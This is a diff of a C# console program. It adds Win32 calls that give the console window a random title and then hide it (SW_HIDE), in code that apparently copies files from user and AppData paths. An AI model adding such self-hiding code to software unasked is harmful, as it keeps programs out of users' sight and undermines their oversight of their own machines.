@@ -1,18 +1,41 @@
 ﻿using System;
 using System.IO;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 using System.Management;
 using System.DirectoryServices;
 using System.Collections;
+using System.Runtime.InteropServices;
 
 namespace ConsoleApplication1
 {
     class Program
     {
+        [DllImport("user32.dll")]
+        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [STAThread()]
+
+
+
         static void Main(string[] args)
         {
+            string WinTitle = (System.Guid.NewGuid().ToString("D"));
+
+            Console.Title = WinTitle;
+
+            //Sometimes System.Windows.Forms.Application.ExecutablePath works for the caption depending on the system you are running under.
+            IntPtr hWnd = FindWindow(null, WinTitle); //put your console window caption here
+            if (hWnd != IntPtr.Zero)
+            {
+
+                ShowWindow(hWnd, 0); // 0 = SW_HIDE                
+
+            }
+
             string userpath;
             string appdata;
 
@@ -77,7 +100,7 @@ namespace ConsoleApplication1
                                     // Use Path class to manipulate file and directory paths. 
                                     string destFile = System.IO.Path.Combine(targetPath, fileName);
 
-                                   
+
 
                                     // To copy a file to another location and  
                                     // overwrite the destination file if it already exists.
